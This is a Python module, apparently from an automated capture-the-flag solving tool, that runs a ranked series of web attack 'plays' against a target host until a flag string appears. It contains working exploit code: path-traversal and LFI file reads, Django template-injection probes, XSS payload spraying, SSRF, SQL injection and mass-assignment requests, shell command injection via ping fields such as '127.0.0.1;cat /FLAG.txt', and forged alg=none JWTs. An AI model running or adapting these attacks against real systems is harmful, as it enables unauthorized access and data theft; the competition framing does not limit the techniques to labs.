"""打法（playbook）：指纹 -> 一串自动化尝试，命中即返回 flag。

约定：每个 play 函数签名 play_x(t) -> str|None
  * t 是 Target（见下），内部自建 Session，不抛异常（除 flag 外一律返回 None）
  * 命中返回 flag 字符串，失败返回 None，方便用 all_plays() 串起来
  * 自动化只覆盖"高复用"的套路；重活（上传链、反序列化、竞态）留给
    playbooks 里标注 MANUAL 的条目 + docs/PLAYBOOK.md 的人工流程
"""
from __future__ import annotations

import re
import urllib.parse

from . import net, payloads

FLAG_RE = re.compile(r"flag\{[^}\s]{1,200}\}")


class Target:
    def __init__(self, host, port=80, scheme="http", timeout=12):
        self.host, self.port, self.scheme, self.timeout = host, port, scheme, timeout
        self.base = f"{scheme}://{host}:{port}"

    def session(self, **kw):
        return net.Session(self.host, self.port, self.scheme, timeout=self.timeout, **kw)

    def __repr__(self):
        return f"<Target {self.base}>"


def _flag(text):
    if not text:
        return None
    m = FLAG_RE.search(text)
    return m.group(0) if m else None


# ---------------------------------------------------------------- 1. 静态/路径类
def play_static_and_paths(t: Target):
    """静态目录、/resource 读文件、常见 flag 落盘位置。"""
    s = t.session()
    try:
        # Apache 把 flag 文件 403 掉 -> 用应用自己的读文件接口
        for url in ("/resource?filename=flag", "/resource?filename=../flag",
                    "/download?file=flag", "/file?name=flag"):
            f = _flag(s.get(url, headers={"Host": "localhost"}).text)
            if f:
                return f
        for p in ("/static/flag", "/flag", "/FLAG.txt", "/flag.txt", "/static/../flag"):
            r = s.get(p)
            f = _flag(r.text)
            if f:
                return f
        # 目录列表里发现 flag 名字
        r = s.get("/static/")
        if r.status == 200 and "Index of" in r.text:
            for name in re.findall(r'href="([^"]*flag[^"]*)"', r.text, re.I):
                f = _flag(s.get("/static/" + name.lstrip("/")).text)
                if f:
                    return f
    finally:
        s.close()
    return None


# ---------------------------------------------------------------- 2. Django SSTI
def play_django_ssti(t: Target):
    """{% debug %} 是最快的 Django 信息泄露：常常直接把 FLAG 打在 context 里。"""
    s = t.session()
    try:
        for ep in ("/greet/", "/greet", "/hello", "/render", "/preview"):
            r = s.get(ep + "?name=" + urllib.parse.quote("{% debug %}"),
                      headers={"Host": "localhost"})
            f = _flag(r.text)
            if f:
                return f
            if "DisallowedHost" in r.text:   # 需要正确 Host
                r = s.get(ep + "?name=" + urllib.parse.quote("{% debug %}"))
                f = _flag(r.text)
                if f:
                    return f
    finally:
        s.close()
    return None


# ---------------------------------------------------------------- 3. Dalgona XSS
def play_dalgona(t: Target):
    """服务端会用无头浏览器执行我们的 payload 并回显 alert 结果。

    关键：先读回显里"哪一步失败"，再按过滤规则选上下文载荷；盲目试很慢。
    """
    s = t.session()
    cands = (payloads.XSS_TEXT + payloads.XSS_ATTR + payloads.XSS_JS +
             payloads.XSS_ALIAS + payloads.XSS_ENTITY + payloads.XSS_CHARCODE)
    try:
        r0 = s.get("/page")
        if "dalgona" not in r0.text.lower() and "xss" not in r0.text.lower():
            return None
        for p in cands:
            for url in ("/page?name=" + urllib.parse.quote(p),
                        "/page?url=" + urllib.parse.quote(p)):
                r = s.get(url)
                f = _flag(r.text)
                if f:
                    return f
            # 有些关卡只收 POST
            for field in ("solution", "name"):
                r = s.post("/page", {field: p})
                f = _flag(r.text)
                if f:
                    return f
    finally:
        s.close()
    return None


# ---------------------------------------------------------------- 4. SSRF
def play_ssrf(t: Target):
    s = t.session()
    try:
        for url in ("/redirect.php?url=http://internal-service",):
            f = _flag(s.get(url).text)
            if f:
                return f
        # 通用：找带 url/uri/target 参数的端点
        for path in ("/fetch?url=", "/proxy?url=", "/api/fetch?url="):
            f = _flag(s.get(path + "http://internal-service").text)
            if f:
                return f
    finally:
        s.close()
    return None


# ---------------------------------------------------------------- 5. FastAPI 招聘类
def play_fastapi_jobs(t: Target):
    """三个高频洞：/jobs SQLi、mass assignment、base64 伪造 token。"""
    s = t.session()
    try:
        # (a) SQLi 直接读 private 行
        for payload in ("private'--", "private' --", "private'/*",
                        "back-end' OR '1'='1'-- -"):
            for path in ("/jobs", "/api/jobs"):
                r = s.request("POST", path, body={"job_type": payload},
                              headers={"Content-Type": "application/json"})
                f = _flag(r.text)
                if f:
                    return f

        # (b) demo/demo -> mass assignment -> 列表里出现 secret
        r = s.post("/token", {"username": "demo", "password": "demo"})
        if r.status in (200, 303, 302):
            for endpoint in ("/system_config/1", "/manage_settings/1", "/profile/1"):
                s.post(endpoint, {"name": "demo", "is_admin": "1"})
            for path in ("/company/1/jobs", "/company/1", "/dashboard"):
                f = _flag(s.get(path).text)
                if f:
                    return f

        # (c) access_token="Bearer MQ==" 型：直接换 id
        cookie = s.cookies.get("access_token", "")
        m = re.search(r"Bearer\s+(\S+)", cookie or "")
        if m:
            for alt in payloads.B64_TOKEN_TRIES:
                for path in ("/company/2/jobs", "/company/0/jobs", "/company/3/jobs"):
                    f = _flag(s.get(path, headers={"Cookie": f'access_token="Bearer {alt}"'}).text)
                    if f:
                        return f
    finally:
        s.close()
    return None


# ---------------------------------------------------------------- 6. 命令注入（ping 类）
def play_ping_injection(t: Target):
    s = t.session()
    payloads_cmd = [
        "127.0.0.1;cat /FLAG.txt",
        "127.0.0.1;cat /flag",
        "127.0.0.1;cat /flag.txt",
        "127.0.0.1;echo $(cat /FLAG.txt) packets received",
        "-t custom \"cat /app/FLAG.txt\"",
    ]
    try:
        for path, field in (("/ping", "ip"), ("/ping", "host"), ("/api/ping", "ip"),
                            ("/", "ip"), ("/", "host")):
            for cmd in payloads_cmd:
                for body in ({field: cmd}, {"host": cmd}, {"ip": cmd}):
                    r = s.post(path, body)
                    f = _flag(r.text)
                    if f:
                        return f
    finally:
        s.close()
    return None


# ---------------------------------------------------------------- 7. LFI
def play_lfi(t: Target):
    s = t.session()
    try:
        for param in ("file", "name", "page", "include", "path", "filename", "template"):
            for path in payloads.LFI_FLAG_TARGETS:
                r = s.get(f"/?{param}={path}")
                f = _flag(r.text)
                if f:
                    return f
    finally:
        s.close()
    return None


# ---------------------------------------------------------------- 8. JWT
def play_jwt_none(t: Target):
    """alg=none / 不验签名 两种最常见。拿到 token 后逐路试。"""
    import base64
    import json
    import time

    def b64(b):
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

    s = t.session()
    try:
        for path in ("/login", "/api/login", "/token"):
            for creds in ({"username": "test", "password": "test"},
                          {"username": "demo", "password": "demo"}):
                r = s.post(path, creds)
                m = re.search(r"eyJ[\w-]+\.[\w-]+\.[\w-]*", r.text + str(s.cookies))
                if not m:
                    continue
                head, body, _ = m.group(0).split(".")
                for sub in payloads.JWT_FORGE_SUBS:
                    pl = {"sub": sub, "user_id": sub, "exp": int(time.time()) + 86400}
                    forged = b64(json.dumps({"alg": "none", "typ": "JWT"}).encode()) + "." + \
                        b64(json.dumps(pl).encode()) + "."
                    for probe in ("/dashboard", "/admin", "/gettheflag", "/profile"):
                        for hdr in ({"Cookie": f"access_token={forged}"},
                                    {"Authorization": "Bearer " + forged}):
                            f = _flag(s.get(probe, headers=hdr).text)
                            if f:
                                return f
    finally:
        s.close()
    return None


def all_plays():
    """按"投入产出比"排序：便宜且高命中的放前面。"""
    return [
        play_static_and_paths,
        play_ssrf,
        play_fastapi_jobs,
        play_django_ssti,
        play_ping_injection,
        play_dalgona,
        play_lfi,
        play_jwt_none,
    ]


def auto(t: Target, log=print):
    for play in all_plays():
        try:
            f = play(t)
        except Exception as e:
            log(f"  {play.__name__}: error {e}")
            continue
        if f:
            log(f"  HIT {play.__name__} -> {f}")
            return f, play.__name__
        log(f"  miss {play.__name__}")
    return None, None
